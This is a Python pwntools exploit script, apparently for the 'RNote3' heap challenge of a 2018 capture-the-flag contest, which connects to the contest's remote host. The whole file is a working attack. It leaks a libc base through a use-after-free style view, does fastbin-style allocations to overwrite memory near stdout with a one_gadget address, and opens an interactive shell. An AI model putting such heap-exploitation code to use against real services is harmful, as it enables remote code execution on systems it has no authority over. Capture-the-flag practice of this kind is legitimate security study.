from pwn import *

def add(title,size,content):
	r.sendline('1')
	r.recvuntil("please input title: ")
	r.sendline(title)
	r.recvuntil("please input content size: ")
	r.sendline(str(size))
	r.recvuntil("please input content: ")
	r.sendline(content)
def view(title):
	r.sendline('2')
	r.recvuntil("please input note title: ")
	r.sendline(title)
	r.recvuntil("content: ")
	msg = r.recvuntil("\n")[:-1]+"\x00\x00"
	return u64(msg)
def edit(title,content):
	r.sendline('3')
	print r.recvuntil("please input note title: ")
	r.sendline(title)
	print r.recvuntil("please input new content: ")
	r.sendline(content)
def delete(title):
	r.sendline('4')
	r.recvuntil('please input note title: ')
	r.sendline(title)
	
#r = process("RNote3")
r = remote("rnote3.2018.teamrois.cn",7322)

r.recvuntil("5. Exit")
add('aaaa',0x20,'A'*8)
add('bbbb',0x80,'A'*8)
add('cccc',0x80,'A'*8)
delete('bbbb')
add('dddd',0x80,'A'*8)
delete('1')

libc = view("\x00") - 0x3c4b78
one_gadget = libc + 0x4526a            
stdout = libc + 0x3c5620
stdin = libc + 0x3c48e0
stderr = libc + 0x3c5540

log.info("libc base: %#x",libc)
log.info("OneGadget: %#x",one_gadget)
log.info("stdout: %#x",stdout)
log.info("stdin: %#x",stdin)
log.info("stderr: %#x",stderr)

add('dddd',0x80,'A'*8)
add('eeee',0x20,'A'*8)
add('ffff',0x68,'A'*8)
add('gggg',0x68,'A'*8)
add('hhhh',0x68,'A'*8)
delete('ffff')
add('ffff',0x68,'A'*8)
delete('1')
delete('gggg')
delete("\x00")
delete('aaaa')
delete('eeee')
add('ffff',0x68,p64(stdout+0x9d))
add('1111',0x68,p64(stdout))
add('1111',0x68,p64(stdout))
payload = '\x00' * 0x2b + p64(stdout + 0xc0) + p64(stderr) + p64(stdout) + p64(stdin) + p64(one_gadget)
add('1111',0x68,payload)
r.sendline('1')
r.interactive()
